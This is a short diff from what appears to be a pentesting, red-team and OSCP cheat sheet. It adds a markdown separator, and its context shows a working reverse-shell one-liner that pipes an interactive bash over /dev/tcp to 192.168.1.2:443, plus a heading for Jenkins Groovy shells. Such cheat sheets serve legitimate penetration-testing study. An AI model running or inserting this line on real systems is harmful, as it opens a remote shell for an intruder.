@@ -232,6 +232,7 @@ __Pentesting - Red Team - CTFs - OSCP__
     exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'");
     }
   ```
+  ---
   
   `Groovy (Jenkins)`
 
